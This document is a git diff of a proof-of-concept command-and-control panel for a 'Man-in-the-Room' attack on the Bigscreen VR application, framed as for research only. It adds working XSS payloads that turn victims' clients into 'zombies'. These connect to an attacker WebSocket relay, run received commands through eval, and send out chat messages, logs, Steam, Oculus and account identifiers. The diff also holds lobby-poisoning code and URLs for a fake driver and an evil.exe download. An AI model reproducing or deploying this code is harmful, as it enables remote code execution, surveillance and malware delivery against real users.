@@ -27,7 +27,7 @@ of concept only. The end user of this software agrees to use this software for e
     <link rel="stylesheet" href="./bootstrap.min.css">
     <link rel="stylesheet" href="./main.css">
 
-    <title>Man-in-the-Room Attack Proof of Concept - Bigscreen</title>
+    <title>MitR and C&amp;C PoC — Bigscreen</title>
 </head>
 <body>
 <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
@@ -40,7 +40,7 @@ of concept only. The end user of this software agrees to use this software for e
     <div class="collapse navbar-collapse" id="navbarSupportedContent">
         <ul class="navbar-nav mr-auto">
             <li class="nav-item active">
-                <a class="nav-link" href="#">Command and control panel <span class="sr-only">(current)</span></a>
+                <a class="nav-link" href="#">Command &amp; control panel <span class="sr-only">(current)</span></a>
             </li>
             <li class="nav-item"><span class="navbar-text">|</span></li>
             <li class="nav-item">
@@ -69,7 +69,7 @@ of concept only. The end user of this software agrees to use this software for e
             </div>
             <div class="modal-body">
                 <ul>
-                    <li><b class="text-danger">Botnet-like group</b> of infected Bigscreen applications that can be controlled by this <b>command and control</b> panel.</li>
+                    <li><b class="text-danger">Botnet-like group</b> of infected Bigscreen applications that can be controlled by this <b>command &amp; control</b> panel.</li>
                     <li>Force <b>download and execution</b> any payload (virus, malware, etc.) to victim's computer. <b class="text-danger">RCE</b></li>
                     <li>Run program on victim's machine.</li>
                     <li>Remote <abbr title="Read–Eval–Print Loop" class="initialism">REPL</abbr> (remote Javascript <code>eval</code>) on victim's machines.<b class="text-danger">JS RCE</b></li>
@@ -115,11 +115,11 @@ of concept only. The end user of this software agrees to use this software for e
                     </li>
                     <li>
                         Peer connection establishment is currently supported only with participants who are already in the room.
-                        This command and control panel does not initiate the connection but accepts incoming connections.
+                        This command &amp; control panel does not initiate the connection but accepts incoming connections.
                         This was sufficient for this proof of concept
                     </li>
                     <li>
-                        Command and control panel currently does not support reconnecting to zombies after page refresh.
+                        Command &amp; control panel currently does not support reconnecting to zombies after page refresh.
                         Please restart relay server if you refresh this page.
                     </li>
                 </ul>
@@ -161,7 +161,7 @@ of concept only. The end user of this software agrees to use this software for e
     <div class="row">
         <div class="col-12">
             <h1>Man-in-the-Room Attack <small class="text-muted">Proof of Concept</small></h1>
-            <h2>Command and control panel: Bigscreen <small class="text-muted"><a href="https://bigscreenvr.com/">https://bigscreenvr.com/</a></small></h2>
+            <h2>Command &amp; control panel: Bigscreen <small class="text-muted"><a href="https://bigscreenvr.com/">https://bigscreenvr.com/</a></small></h2>
         </div>
         <div class="col-6">
             <form class="form-inline justify-content-center" id="infectLobbyForm">
@@ -170,7 +170,7 @@ of concept only. The end user of this software agrees to use this software for e
                     <input class="form-control m-2" name="targetUser" id="targetUser" value="Bob" type="text" placeholder="Bob" disabled>
                 </div>
                 <div class="form-group form-check">
-                    <input class="form-check-input my-2 ml-3" type="checkbox" value="" id="worm" >
+                    <input class="form-check-input my-2 ml-3" type="checkbox" value="" id="worm" disabled >
                     <label class="form-check-label m-2" for="worm">Worm</label>
                 </div>
                 <input class="btn btn-danger m-2" type="submit" value="Start poisoning lobby">
@@ -262,14 +262,12 @@ of concept only. The end user of this software agrees to use this software for e
  * of concept only. The end user of this software agrees to use this software for education and research purposes only.
  */
 
-// show disclaimer
-$('#disclaimerModal').modal({backdrop:'static',keyboard:false});
 
 //region Configuration
 
-/** URL of WebSocket server which relays communication between Command and Control panel and zombies. */
-const relayWebSocketServerUrl = 'ws://172.26.103.128:8081'; // TODO
-/** URL of static web server which hosts this Command and Control panel */
+/** URL of WebSocket server which relays communication between Command & control panel and zombies. */
+const relayWebSocketServerUrl = 'ws://172.26.103.128:8081';
+/** URL of static web server which hosts this Command & control panel */
 const webServerUrl = 'http://172.26.103.128:8080/';
 const fakeDriverUrl = webServerUrl + 'payloads/VR_driver_0.34.0.exe';
 const evilPayloadUrl = webServerUrl + 'payloads/evil.exe';
@@ -291,7 +289,6 @@ const webRtcConfig = {
 
 //endregion
 
-
 // region GUI bindings
 const joinRoomForm = document.getElementById('joinRoomForm');
 const infectLobbyForm = document.getElementById('infectLobbyForm');
@@ -299,12 +296,748 @@ const roomsElement = document.getElementById('rooms');
 const roomIdInput = document.getElementById('roomIdInput');
 //endregion
 
+//region XSS payloads
+let hideUsernameFromRoomPreview = `Array.prototype.forEach.call(document.getElementById('room-card-players').childNodes,function(e,i,a){if(e.nodeName==='#text' && e.data==='${textName}'){if(i!==0){a[i-1].remove();}e.remove();}});`;
+let hideFirstCommaFromRoomPreview = "setTimeout(function(){var n=document.getElementById('room-card-players').childNodes;if(n[0]&&n[1]&&n[0].nodeName==='SCRIPT'&&n[1].nodeName==='#text'&& n[1].data===', '){n[1].remove()}},1);";
+let hideUsernameFromRoomParticipants = `Array.prototype.forEach.call(document.querySelectorAll('#room-participants li'),function(e){if(e.querySelector('h3.user-name').firstChild.nodeValue==='${textName}'){e.remove()}});`;
+let persistentChatEavesdropping = `;sendChat=function(){var s=new WebSocket('${relayWebSocketServerUrl}');s.onopen=function(){s.send(JSON.stringify({'type':'chat','roomId':roomState.roomId,'name':NAME,uuid:ACCOUNT.uuid,'steamId':mySteamId,'oculusId':myOculusId,'message':$('#room-chat-input').val()}));if(canSendChatMessage){canSendChatMessage= false;var _0x1865xb7=$(_0x6af9[1362])[_0x6af9[743]]();if(_0x1865xb7!= _0x6af9[90]){$(_0x6af9[1362])[_0x6af9[743]](_0x6af9[90]);$(_0x6af9[1362])[_0x6af9[1359]]();displayChatMessage(_0x1865xb7,USER);Unity[_0x6af9[1072]](_0x6af9[1971],[_0x1865xb7],USER,_0x6af9[1972]);gaChatMessageSentEvent()};setTimeout(function(){canSendChatMessage= true},CHATRATELIMIT)};};};`;
+let makeZombie = `if(!window.sz || window.sz.readyState==3){window.sz=new WebSocket('${relayWebSocketServerUrl}');sz.onopen=function(){sz.send(JSON.stringify({'type':'zombie-register','steamId':mySteamId,'oculusId':myOculusId,'uuid':ACCOUNT.uuid,name:NAME}))};sz.onmessage=function(e){var m=JSON.parse(e.data);if(m.type==='zombie-cmd'){sz.send(JSON.stringify({type:'zombie-result','steamId':mySteamId,'oculusId':myOculusId,'uuid':ACCOUNT.uuid,result:eval(m.cmd)}));}else if(m.type==='zombie-ping'){sz.send(JSON.stringify({type:'zombie-pong',uuid:ACCOUNT.uuid,}));}};};`;
+let discoverRoom = `joinRoomWithId = function(roomId) {var srd=new WebSocket('${relayWebSocketServerUrl}');srd.onopen=function(){srd.send(JSON.stringify({'type':'room-discovered','roomId':roomId,})); checkMyUserCreatedRoom(); signal["write"]({ 'type': "room-join", 'roomId': roomId, 'name': NAME, 'uuid': ACCOUNT["uuid"], 'version': UNITYVERSION, 'steamId': mySteamId, 'oculusId': myOculusId }); srd.close(); };};`;
+let persistentLogsEavesdropping = `var nl = function(level, args){var sl=new WebSocket('${relayWebSocketServerUrl}');sl.onopen=function(){sl.send(JSON.stringify({type:'log',uuid:ACCOUNT.uuid,level:level,message:args}));sl.close();};}; console.log=function(){nl('console.log',arguments)};Unity.log=function(){nl('Unity.log',arguments)};Unity.logError=function(){nl('Unity.logError',arguments)};`;
+//endregion
+
 let rooms = {};
 let roomRepls = {};
 let dataChannelSend, dataChannelReceive;
 
+function generateBigscreenUuid() {
+  function bigscreenRand() {
+    return Math["floor"]((1 + Math["random"]()) * 65536).toString(16) ["substring"](1)
+  }
+  return bigscreenRand() + bigscreenRand() + "-" + bigscreenRand() + "-" + bigscreenRand() + "-" + bigscreenRand() + "-" + bigscreenRand() + bigscreenRand() + bigscreenRand()
+}
+
 function removePayloadFromName(name){
     return (name.includes('<')?name.substring(0,name.indexOf('<')):name);
+}
+
+var messageRelayWs = new WebSocket(relayWebSocketServerUrl);
+messageRelayWs.onopen = function(){
+    messageRelayWs.send(JSON.stringify({type:'control-panel-connect'}));
+};
+messageRelayWs.onmessage = function(event){
+    let message = JSON.parse(event.data);
+    console.log("messageRelayWs received:", message);
+    switch (message.type) {
+        case 'chat': {
+            let date = new Date();
+            if (rooms[message.roomId]) {
+                rooms[message.roomId].roomUI.renderChatMessage(message.message, message.name, date);
+            }
+            if (zombiesManager.zombies[message.uuid]) {
+                zombiesManager.zombies[message.uuid].zombieControlUI.renderChatMessage(message.message, message.roomId, date);
+            }
+            break;
+        }
+        case 'log': {
+            if (zombiesManager.zombies[message.uuid]) {
+                zombiesManager.zombies[message.uuid].zombieControlUI.renderLogMessage(message.level, message.message);
+            }
+            break;
+        }
+        case 'room-discovered':
+            discoveredRoomsManager.addRoom(message.roomId);
+            break;
+        case 'zombie-register': {
+            console.log('New zombie:', message.uuid);
+            zombiesManager.addZombie(message.uuid, message.steamId, message.oculusId, message.name);
+
+            let roomRepl = roomRepls[message.uuid];
+            zombiesManager.zombies[message.uuid].repls.push(roomRepl);
+            zombiesManager.zombies[message.uuid].repls.forEach(function(repl) {
+                repl.formElement.addEventListener("submit", function (event) {
+                    event.preventDefault();
+                    let cmd = repl.inputElement.value;
+                    repl.inputElement.value = '';
+                    // render cmd in all repls associated with this zombie (in zombie control and in room)
+                    zombiesManager.zombies[message.uuid].repls.forEach(
+                        function(repl) {repl.renderCmd(cmd);}
+                    );
+                    sendZombieCmd(message.uuid, cmd);
+                });
+            });
+            break;
+        }
+        case 'zombie-result': {
+            console.log('Zombie :', message.uuid, 'Result:', message.result);
+            zombiesManager.zombies[message.uuid].repls.forEach(function(repl){
+                repl.renderResult(message.result);
+            });
+
+            break;
+        }
+        case 'zombie-pong': {
+            zombiesManager.receivedPong(message.uuid);
+            break;
+        }
+        default:
+            console.warn('messageRelayWs unexpected message');
+    }
+};
+
+function sendZombieCmd(zombieUuid, cmd){
+    console.debug('sendZombieCmd', zombieUuid, cmd);
+    messageRelayWs.send(JSON.stringify({
+        type: "zombie-cmd",
+        uuid: zombieUuid,
+        cmd: cmd
+    }));
+}
+
+function LobbyPoisoner(roomName, attackerIdentity, onStarted, onStopped){
+    // TODO: infectLobbyForm form fields `worm` and `targetUser` are currently ignored, worm=false, targetUser='Bob'
+    let that = this;
+    this.signalingWs = null;
+    this.onStarted = onStarted;
+    this.onStopped = onStopped;
+    this.state = 'new';
+
+    this.roomId = null;
+    this.roomName = roomName;
+    this.roomDescription = 'Just my own room.';
+    this.attackerIdentity = attackerIdentity;
+
+    this.start = function(){
+        this.state = 'starting';
+        this.createPublicRoom();
+    };
+    this.stop = function(){
+        this.leaveRoom();
+        this.state = 'stopped';
+        this.onStopped();
+        console.info('LobbyPoisoner: Stopped infecting lobby.');
+    };
+
+    this.createPublicRoom = function(){
+        this.signalingWs = new WebSocket(bigscreenSignalUrl);
+        this.signalingWs.binaryType = 'arraybuffer';
+        this.signalingWs.onopen = function (event) {
+            console.debug('LobbyPoisoner connected', event);
+            that.sendSignalingMessage({type: 'register-desktop'});
+            console.debug('LobbyPoisoner registered');
+
+            that.sendSignalingMessage({
+                'type': "room-create",
+                'name': that.roomName,
+                'description': that.roomDescription,
+                'isPrivate': false,
+                'category': "Chat",
+                'creatorName': that.attackerIdentity.name,
+                'creatorUuid': that.attackerIdentity.uuid,
+                'environment': "Cinema",
+                'version': "0.34.0",
+                'size': 12,
+                'roomType': "bigroom"
+              });
+            console.debug('LobbyPoisoner requested to create room');
+        };
+        this.signalingWs.onclose = function (event) {
+            console.debug('LobbyPoisoner onClose disconnected', event);
+        };
+        this.signalingWs.onmessage = function (event) {
+            that.onSignalingMessage(event);
+        };
+        this.signalingWs.onerror = function (event) {
+            console.error('LobbyPoisoner onError event', event);
+        };
+    };
+
+    this.sendSignalingMessage = function(message) {
+        console.debug('sendSignalingMessage', message);
+        this.signalingWs.send(msgpack.encode(message));
+    };
+
+    this.joinRoom = function(){
+        that.sendSignalingMessage({
+          'type': "room-join",
+          'roomId': that.roomId,
+          'name': that.attackerIdentity.name,
+          'uuid': that.attackerIdentity.uuid,
+          'version': unityVersion,
+          'steamId': that.attackerIdentity.steamId,
+          'oculusId': that.attackerIdentity.oculusId
+        });
+        console.debug('LobbyPoisoner requested to join room', that.roomId);
+    };
+
+    this.leaveRoom = function(){
+        this.state = 'leaving';
+        this.sendSignalingMessage({type: "room-leave"});
+        this.signalingWs.close();
+        this.signalingWs = null;
+    };
+
+    this.onSignalingMessage = function(event) {
+        let message = msgpack.decode(new Uint8Array(event.data));
+        console.debug('LobbyPoisoner.onSignalingMessage()', message);
+
+        switch (message.type) {
+            case "room-created":
+                this.roomId = message.roomId;
+                console.info('LobbyPoisoner: room created', this.roomId);
+                this.joinRoom();
+                break;
+
+            case "user-left":
+                console.debug(`LobbyPoisoner: Participant ${message.userId} left room ${this.roomId}.`);
+                break;
+
+            case "user-joined":
+                if(message.uuid === this.attackerIdentity.uuid){
+                    this.attackerIdentity.userId = message.userId;
+                    console.debug('LobbyPoisoner: set attackerIdentity.userId', this.attackerIdentity.userId);
+                    console.debug('LobbyPoisoner: user ready');
+
+                    this.sendSignalingMessage({
+                        type: "user-ready",
+                        roomId: this.roomId,
+                        userId: this.attackerIdentity.userId
+                    });
+
+                    this.state = 'started';
+                    this.onStarted();
+
+                    console.info('LobbyPoisoner: Started infecting lobby.');
+                }
+                else{
+                    console.debug(`LobbyPoisoner: Participant ${message.userId} joined room ${this.roomId}.`);
+                }
+                break;
+
+            case "admin":
+            case "room-latest":
+            case "linkedpc-joined":
+            case "linkedpc-left":
+            case "party-join":
+            case "user-ready":
+            case "room-join-fail":
+            case "room-environment":
+            case "room-private":
+            case "room-public":
+            case "events":
+            case "server-time":
+            case 'ice':
+            case 'offer':
+            case 'answer':
+                console.debug('received message ignored', message);
+                break;
+
+            default:
+                console.error('Unexpected message type (server to client):', message);
+                break;
+        }
+    };
+
+}
+
+/**
+ * Room with connection to signalling server and participants.
+ */
+function Room(roomId, attackerIdentity){
+    this.attackerIdentity = attackerIdentity;
+
+    this.roomId = roomId;
+    this.name = null;
+    this.description = null;
+    this.private = null;
+    this.size = null;
+    this.createdName = null;
+    this.createdTime = null;
+    this.roomType = null;
+    this.category = null;
+    this.environment = null;
+    this.version = null;
+
+    this.locks = null;
+
+    this.lastUpdated = null;
+
+    this.signalingWs = null;
+
+    this.roomUI = null;
+    this.roomParticipants = {};
+
+    //region Init roomParticipants
+    /*
+     * TODO: Change app's logic so that we could periodically update room state and participants without losing
+     * connections.
+     * TODO: We currently do not support dealing with users leaving and joining room. We only support connection to
+     * users who are already in the room when we join.
+     */
+    this._initRoomParticipants = function(onSuccess, onError){
+        let that = this;
+        let xhr = new XMLHttpRequest();
+        xhr.overrideMimeType("application/json");
+        xhr.onload = function () {
+            let roomState = JSON.parse(xhr.responseText);
+            let users = [];
+            for(let key in roomState){
+                if(roomState.hasOwnProperty(key) && (key.split('.')[0].substr(0,4) === 'user' )) {
+                    let user = key.split('.')[0];
+                    if(!users.includes(user)){users.push(user);}
+                }
+            }
+            for (let i = 0; i < users.length; i++) {
+                let userId = users[i];
+                let identity = new Identity(
+                    roomState[userId + '.name'],
+                    roomState[userId + '.uuid'],
+                    roomState[userId + '.steam'] ? roomState[userId + '.steam'] : ''
+                );
+                that.roomParticipants[userId] = new RoomParticipant(identity, that, userId);
+            }
+            onSuccess();
+        };
+        xhr.onerror = function () {
+            console.error('ERROR', 'Room.initRoomParticipants()', xhr, that);
+            onError();
+        };
+        xhr.open('GET', 'https://signal2adm.bigscreenvr.com/roomstate?roomId=' + this.roomId, true);
+        xhr.send();
+    };
+    //endregion
+
+    //region Load room information
+    this._loadRoomInformation = function(onSuccess, onError){
+        let that = this;
+        let xhr = new XMLHttpRequest();
+        xhr.overrideMimeType("application/json");
+        xhr.onload = function () {
+            let roomState = JSON.parse(xhr.responseText);
+
+            that.name = roomState.name;
+            that.description = roomState.description;
+            that.private = roomState.private;
+            that.size = roomState.size;
+            that.createdName = roomState['created.name'];
+            that.createdTime = roomState['created.time'];
+            that.roomType = roomState.roomType;
+            that.category = roomState.category;
+            that.environment = roomState.environment;
+            that.version = roomState.version;
+
+            that.lastUpdated = new Date();
+            onSuccess();
+        };
+        xhr.onerror = function () {
+            console.error('ERROR', 'Room.update()', xhr, that);
+            onError();
+        };
+        xhr.open('GET', 'https://signal2adm.bigscreenvr.com/roomstate?roomId=' + this.roomId, true);
+        xhr.send();
+    };
+    //endregion
+
+    /**
+     * ASYNC Load room information from server.
+     * Set room's data and create child objects based on retrieved infromation.
+     */
+    this._load = function(onSuccess, onError){
+        let that = this;
+        this._initRoomParticipants(
+            function(){that._loadRoomInformation(onSuccess, onError);},
+            onError
+        );
+    };
+
+    this.sendSignalingMessage = function(message) {
+        console.log('sendSignalingMessage', message);
+        this.signalingWs.send(msgpack.encode(message));
+    };
+
+    this.kickParticipant = function(userId){
+        this.sendSignalingMessage({
+            type: "admin",
+            action: "kick",
+            roomId: this.roomId,
+            targetUser: userId
+        });
+    };
+
+    this.updateLockSettings = function(locks){
+        this.roomUI.updateLockSettings(locks);
+
+        this.sendSignalingMessage({
+          type: 'admin',
+          action: 'lock',
+          roomId: this.roomId,
+          msg: [
+            (locks.lockBigscreen ? '' : 'un') + 'lock-bigscreen',
+            (locks.lockDesktopAudio ? '' : 'un') + 'lock-desktopaudio',
+            (locks.lockDrawing ? '' : 'un') + 'lock-drawing',
+            (locks.lockMicrophones ? '' : 'un') + 'lock-microphones'
+          ]
+        });
+    };
+
+    /**
+     * Join room. Connect to signaling server and establish WebRTC channels
+     * with other room participants.
+     */
+    this.join = function(){
+        let that = this;
+        this.signalingWs = new WebSocket(bigscreenSignalUrl);
+        this.signalingWs.binaryType = 'arraybuffer';
+        this.signalingWs.onopen = function (event) {
+            console.log('connected', event);
+
+            let roomUI = new RoomUI(roomId, that);
+            roomUI.render(roomsElement);
+            that.roomUI = roomUI;
+            for (let userId in that.roomParticipants){
+                if(that.roomParticipants.hasOwnProperty(userId)){
+                    that.roomParticipants[userId].render();
+                }
+            }
+
+            that.sendSignalingMessage({type: 'register-desktop'});
+            console.log('registered');
+
+            that.sendSignalingMessage({
+                'type': "room-join",
+                'roomId': that.roomId,
+                'name': that.attackerIdentity.name,
+                'uuid': that.attackerIdentity.uuid,
+                'version': unityVersion,
+                'steamId': that.attackerIdentity.steamId,
+                'oculusId': that.attackerIdentity.oculusId
+            });
+        };
+        this.signalingWs.onclose = function (event) {
+            console.log('onClose disconnected', event);
+        };
+        this.signalingWs.onmessage = function (event) {
+            that.onSignalingMessage(event);
+        };
+        this.signalingWs.onerror = function (event) {
+            console.log('onError event', event);
+        };
+    };
+
+    this.leave = function(){
+        for (let userId in this.roomParticipants){
+            if(this.roomParticipants.hasOwnProperty(userId)){
+                this.roomParticipants[userId].hide();
+                this.roomParticipants[userId].closeConnections();
+                delete this.roomParticipants[userId];
+            }
+        }
+        this.roomUI.hide();
+        this.sendSignalingMessage({type: "room-leave"});
+        this.signalingWs.close();
+        this.signalingWs = null;
+    };
+
+    this.onSignalingMessage = function(event) {
+        let message = msgpack.decode(new Uint8Array(event.data));
+        console.log('Room.onSignalingMessage()', message);
+
+        switch (message.type) {
+            case "user-left":{
+                this.roomParticipants[message.userId].hide();
+                this.roomParticipants[message.userId].closeConnections();
+                delete this.roomParticipants[message.userId];
+                console.log(`Participant ${message.userId} left room ${this.roomId}.`);
+                break;
+            }
+            case "admin": {
+                if(message.action === 'lock'){
+                    this.locks = {
+                        lockBigscreen: message.msg.includes('lock-bigscreen'),
+                        lockDesktopAudio: message.msg.includes('lock-desktopaudio'),
+                        lockDrawing: message.msg.includes('lock-drawing'),
+                        lockMicrophones: message.msg.includes('lock-microphones'),
+                    };
+                    this.roomUI.updateLockSettings(this.locks);
+                    console.log('updated locks', this.locks);
+                }
+                else{
+                    console.error('unexpected action of message', message);
+                }
+                break;
+            }
+            case "room-latest":
+            case "linkedpc-joined":
+            case "linkedpc-left":
+            case "party-join":
+            case "user-ready":
+            case "room-join-fail":
+            case "room-created":
+            case "room-environment":
+            case "room-private":
+            case "room-public":
+            case "events":
+            case "server-time":
+                console.log('received message ignored', message);
+                break;
+
+            case "user-joined":
+                if(message.uuid === this.attackerIdentity.uuid){
+                    this.attackerIdentity.userId = message.userId;
+                    console.log('set attackerIdentity.userId', this.attackerIdentity.userId);
+                    console.log('user ready');
+
+                    this.sendSignalingMessage({
+                        type: "user-ready",
+                        roomId: this.roomId,
+                        userId: this.attackerIdentity.userId
+                    });
+                }
+                break;
+
+            case 'ice':
+                console.log('onMessage received ICE');
+                console.assert(message.fromDevice === 'desktop', message.fromDevice);
+
+                const candidateStartPos = message.value.indexOf('candidate:');
+                let beforeCandidate  = message.value.slice(0,candidateStartPos);
+                let sdpMLineIndex = beforeCandidate.slice(0, beforeCandidate.indexOf('bigscreen_sdp_mline_index'));
+                let sdpMid = beforeCandidate.slice(
+                    beforeCandidate.indexOf('bigscreen_sdp_mline_index') + 'bigscreen_sdp_mline_index'.length,
+                    beforeCandidate.indexOf('bigscreen_sdp_mid'));
+                let candidate = new RTCIceCandidate({
+                    sdpMid: sdpMid,
+                    sdpMLineIndex: sdpMLineIndex,
+                    candidate: message.value.slice(candidateStartPos)
+                });
+                {
+                    if( ! this.roomParticipants[message.fromUser]){
+                        console.error('ERROR', 'RoomParticipant object does not exist for sender of this received WebRTC ICE.');
+                        return;
+                    }
+                    if( ! this.roomParticipants[message.fromUser].connections[message.PCID]){
+                        console.error('ERROR', 'Connection object was not found in connections of sender of this received WebRTC ICE.');
+                        return;
+                    }
+                    let connection = this.roomParticipants[message.fromUser].connections[message.PCID];
+                    console.log('ice conn', connection);
+                    connection.rtcPeerConnection.addIceCandidate(candidate);
+                }
+                break;
+            case 'offer':
+                console.log('onMessage received OFFER');
+                console.assert(message.fromDevice === 'desktop', message.fromDevice);
+
+                {
+                    let roomParticipant = this.roomParticipants[message.fromUser];
+                    if( ! roomParticipant){
+                        console.error('ERROR', 'RoomParticipant object does not exist for sender of this received WebRTC SDP Offer.');
+                        return;
+                    }
+                    let connection = new Connection(message.SCID, message.PCID, roomParticipant);
+                    roomParticipant.connections[message.PCID] = connection;
+
+                    if (!connection.isInitiator && !connection.isStarted) {
+                        connection.maybeStart();
+                    }
+                    connection.rtcPeerConnection.setRemoteDescription(new RTCSessionDescription(
+                        {type: message.type, sdp: message.value, SCID: connection.scid, pcid: connection.pcid}));
+                    connection.doAnswer();
+                }
+                break;
+            case 'answer':
+                console.error('onMessage received ANSWER');
+
+                console.assert(message.roomId === this.roomId, message.roomId, this.roomId);
+                console.assert(message.targetUser === this.attackerIdentity.userId, message.targetUser, this.attackerIdentity.userId);
+                console.assert(message.fromDevice === 'desktop', message.fromDevice);
+                console.assert(message.targetDevice === 'desktop', message.targetDevice);
+                {
+                    if( ! this.roomParticipants[message.fromUser]){
+                        console.error('ERROR', 'RoomParticipant object does not exist for sender of this received WebRTC SDP Answer.');
+                        return;
+                    }
+                    if( ! this.roomParticipants[message.fromUser].connections[message.PCID]){
+                        console.error('ERROR', 'Connection object was not found in connections of sender of this received WebRTC SDP Answer.');
+                        return;
+                    }
+                    let connection = this.roomParticipants[message.fromUser].connections[message.PCID];
+                    if (connection.isStarted) {
+                        connection.setRemoteDescription(new RTCSessionDescription(
+                            {
+                                type: message.type,
+                                sdp: message.value,
+                                scid: connection.scid,
+                                pcid: connection.pcid
+                            }));
+                    }
+                }
+                break;
+            default:
+                console.error('Unexpected message type (server to client):', message);
+                break;
+        }
+    };
+}
+
+function RoomUI(roomId, room){
+    let that = this;
+    this.room = room;
+    let roomCardTempalte = document.createElement('template');
+    roomCardTempalte.innerHTML =
+        '<div class="card my-3">\n' +
+        '    <div class="card-header">' +
+        '       <span class="roomId"></span>' +
+        '       <div class="dropdown display-inline-block">\n' +
+        '           <button class="btn btn-info dropdown-toggle" type="button" data-toggle="dropdown">' +
+        '               <b class="icon">⚙</b>' +
+        '               Settings' +
+        '           </button>\n' +
+        '           <div class="dropdown-menu">\n' +
+        '               <button class="_lockBigscreen dropdown-item text-white" type="button">\n' +
+        '                   <b class="icon">🔓</b><b>Lock the big screen</b><br/>\n' +
+        '                   Avoid interruptions when watching movies on the big screen.<br/> Prevent users from changing the big screen.\n' +
+        '               </button>\n' +
+        '               <button class="_lockDesktopAudio dropdown-item text-white" type="button">\n' +
+        '                   <b class="icon">🔓</b><b>Lock desktop audio streaming</b><br/>\n' +
+        '                   Prevent anyone from broadcasting a new Desktop Audio stream to the room.\n' +
+        '               </button>\n' +
+        '               <button class="_lockDrawing dropdown-item text-white" type="button">\n' +
+        '                   <b class="icon">🔓</b><b>Lock 3D Drawing markers</b><br/>\n' +
+        '                   Prevent anyone from using 3D markers to draw in your room.\n' +
+        '               </button>\n' +
+        '           </div>\n' +
+        '       </div>' +
+        '       <button class="btn btn-danger _leave" type="button">' +
+        '           <b class="icon">👋</b>' +
+        '           Leave' +
+        '       </button>\n' +
+        '    </div>\n' +
+        '    <div class="card-body">\n' +
+        '        <div class="row">\n' +
+        '            <div class="col-6 col-sm-4">\n' +
+        '                <div class="card">\n' +
+        '                    <div class="card-header"><b class="icon">📧</b>Chat</div>\n' +
+        '                    <div class="card-body chat">\n' +
+        '                    </div>\n' +
+        '                </div>\n' +
+        '            </div>\n' +
+        '            <div class="col-6 col-sm-8">\n' +
+        '                <div class="row"></div>\n' +
+        '            </div>\n' +
+        '      </div>\n' +
+        '  </div>\n' +
+        '</div>';
+    this.roomCardElement = roomCardTempalte.content.firstChild;
+
+    this.lockElements = {
+        lockBigscreenButton: this.roomCardElement.querySelector('._lockBigscreen'),
+        lockDesktopAudioButton:  this.roomCardElement.querySelector('._lockDesktopAudio'),
+        lockDrawingButton: this.roomCardElement.querySelector('._lockDrawing'),
+    };
+    this.lockElements.lockBigscreenButton.addEventListener("click", function (event) {
+        let locks = that.room.locks;
+        locks.lockBigscreen = ! locks.lockBigscreen;
+        that.room.updateLockSettings(locks);
+    });
+    this.lockElements.lockDesktopAudioButton.addEventListener("click", function (event) {
+        let locks = that.room.locks;
+        locks.lockDesktopAudio = ! locks.lockDesktopAudio;
+        that.room.updateLockSettings(locks);
+    });
+    this.lockElements.lockDrawingButton.addEventListener("click", function (event) {
+        let locks = that.room.locks;
+        locks.lockDrawing = ! locks.lockDrawing;
+        that.room.updateLockSettings(locks);
+    });
+
+    this.roomCardElement.querySelector('._leave').addEventListener("click", function (event) {
+        that.room.leave();
+        delete rooms[that.room.roomId];
+    });
+
+    this.roomIdElement = this.roomCardElement.querySelector('.card-header span.roomId');
+    this.roomIdElement.appendChild(document.createTextNode(roomId));
+
+    this.chatBodyElement = this.roomCardElement.querySelector('div div div div div.card-body');
+    this.participantsElement = this.roomCardElement.querySelector('div div div div.row');
+
+    this.updateLockSettings = function(locks){
+        if(locks.lockBigscreen) {
+            this.lockElements.lockBigscreenButton.classList.remove('bg-danger');
+            this.lockElements.lockBigscreenButton.classList.add('bg-success');
+            this.lockElements.lockBigscreenButton.getElementsByTagName('b')[0].innerHTML = '';
+            this.lockElements.lockBigscreenButton.getElementsByTagName('b')[0].appendChild(
+                document.createTextNode('🔒')
+            );
+        }
+        else{
+            this.lockElements.lockBigscreenButton.classList.add('bg-danger');
+            this.lockElements.lockBigscreenButton.classList.remove('bg-success');
+            this.lockElements.lockBigscreenButton.getElementsByTagName('b')[0].innerHTML = '';
+            this.lockElements.lockBigscreenButton.getElementsByTagName('b')[0].appendChild(
+                document.createTextNode('🔓')
+            );
+        }
+
+        if(locks.lockDesktopAudio) {
+            this.lockElements.lockDesktopAudioButton.classList.remove('bg-danger');
+            this.lockElements.lockDesktopAudioButton.classList.add('bg-success');
+            this.lockElements.lockDesktopAudioButton.getElementsByTagName('b')[0].innerHTML = '';
+            this.lockElements.lockDesktopAudioButton.getElementsByTagName('b')[0].appendChild(
+                document.createTextNode('🔒')
+            );
+        }
+        else{
+            this.lockElements.lockDesktopAudioButton.classList.add('bg-danger');
+            this.lockElements.lockDesktopAudioButton.classList.remove('bg-success');
+            this.lockElements.lockDesktopAudioButton.getElementsByTagName('b')[0].innerHTML = '';
+            this.lockElements.lockDesktopAudioButton.getElementsByTagName('b')[0].appendChild(
+                document.createTextNode('🔓')
+            );
+        }
+
+        if(locks.lockDrawing) {
+            this.lockElements.lockDrawingButton.classList.remove('bg-danger');
+            this.lockElements.lockDrawingButton.classList.add('bg-success');
+            this.lockElements.lockDrawingButton.getElementsByTagName('b')[0].innerHTML = '';
+            this.lockElements.lockDrawingButton.getElementsByTagName('b')[0].appendChild(
+                document.createTextNode('🔒')
+            );
+        }
+        else{
+            this.lockElements.lockDrawingButton.classList.add('bg-danger');
+            this.lockElements.lockDrawingButton.classList.remove('bg-success');
+            this.lockElements.lockDrawingButton.getElementsByTagName('b')[0].innerHTML = '';
+            this.lockElements.lockDrawingButton.getElementsByTagName('b')[0].appendChild(
+                document.createTextNode('🔓')
+            );
+        }
+    };
+
+    this.render = function(parentElement){
+        parentElement.appendChild(this.roomCardElement);
+    };
+
+    this.hide = function(){
+        this.roomCardElement.parentNode.removeChild(this.roomCardElement);
+    };
+
+    this.renderChatMessage = function(message, sender, date){
+        let chatMessageTemplate = document.createElement('template');
+        chatMessageTemplate.innerHTML =
+            '<blockquote class="blockquote">\n' +
+            '    <p class="mb-0"></p>\n' +
+            '    <footer class="blockquote-footer"><cite title="Sender"></cite></footer>\n' +
+            '</blockquote>\n';
+        let chatMessageElement = chatMessageTemplate.content.firstChild;
+        chatMessageElement.querySelector('p').appendChild(document.createTextNode(message));
+        chatMessageElement.querySelector('footer cite').appendChild(document.createTextNode(sender));
+        chatMessageElement.querySelector('footer').appendChild(document.createTextNode(' at '+date));
+        this.chatBodyElement.appendChild(chatMessageElement);
+
+        this.chatBodyElement.scrollTop = this.chatBodyElement.scrollHeight;
+    }
 }
 
 /**
@@ -695,859 +1428,6 @@ function RoomParticipant(identity, room, userId){
     }
 }
 
-//region XSS payloads
